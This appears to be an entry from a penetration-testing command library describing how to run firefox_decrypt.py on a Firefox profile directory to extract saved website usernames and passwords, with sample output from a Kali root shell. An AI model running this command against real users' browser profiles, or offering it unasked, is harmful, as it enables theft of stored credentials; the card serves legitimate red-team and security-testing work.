---
id: a3f9e79f-9da9-46d1-bb28-a4058903d083
name: Firefox Decrypt Extract Passwords from a Profile
type: command
executor: bash
data: python firefox_decrypt.py $DEST_DIRECTORY
output: "root@kali:~/# python firefox_decrypt.py .mozilla/firefox\n\nMaster Password\
  \ for profile .mozilla/firefox/fx35xcj1.default: \n\nWebsite:   https://mysite.com\n\
  Username: 'root'\nPassword: 'secretpassword'"
created_at: '2019-10-23T21:39:44.671318+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Firefox Decrypt Extract Passwords from a Profile

```bash
python firefox_decrypt.py $DEST_DIRECTORY
```

## Expected Output

```
root@kali:~/# python firefox_decrypt.py .mozilla/firefox

Master Password for profile .mozilla/firefox/fx35xcj1.default: 

Website:   https://mysite.com
Username: 'root'
Password: 'secretpassword'
```


